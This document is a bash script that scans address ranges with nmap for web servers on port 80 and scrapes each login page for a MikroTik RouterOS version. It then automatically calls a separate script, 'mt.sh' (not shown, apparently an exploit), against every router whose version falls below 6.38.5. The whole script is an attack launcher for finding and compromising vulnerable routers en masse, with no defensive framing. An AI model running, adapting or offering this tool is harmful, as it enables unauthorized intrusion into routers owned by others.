#!/bin/bash
clear
nmap_path=`which nmap`
file_name=`echo $1 | awk -F "/" '{print $1}'`

$nmap_path -sT -p 80 --open $1 -oG - | awk '$4=="Ports:"{print $2,":"$5}' | awk -F "/" '{print $1}' > output_`echo $1 | awk -F "/" '{print $1}'`.txt

 #file_content=`cat output_$file_name.txt`
 IFS=$'\r\n' GLOBIGNORE='*' command eval  'arr=($(cat output_$file_name.txt))'





for i in "${arr[@]}"
do

	#sh ./mt.sh  echo -n "${arr[3]//[[:space:]]/}"
	echo  'testing : '$i
	ver=`curl --connect-timeout 3 -m 3 -s $i | grep -i RouterOS | awk -F ">" {'print $2'} | awk -F "<" {'print $1'} | head -2 | grep -v "configura" | awk -F "v" {'print $2'} | awk -F "." {'print $2"."$3'}` 
	ver_total=`curl --connect-timeout 3 -m 3 -s $i | grep -i RouterOS | awk -F ">" {'print $2'} | awk -F "<" {'print $1'} | head -2 | grep -v "configura" | awk -F "v" {'print $2'} `
	version_ok=38.5
if [ -z "$ver" ]
	then
		echo "Jo Mikrotik" #> /dev/null
	else
		if [[ "$ver" < "$version_ok" ]]
		then
			#echo $i---VERSION----$ver
			ip=`echo $i | awk -F ":" '{print $1}'`
			port=`echo $i | awk -F ":" '{print $2}'`
			#echo 'test'
			echo $ip $port $ver_total
			./mt.sh $ip $ver_total  $port 'x86'
		else
			echo "Not supported" #> /dev/null
		fi		
fi			
done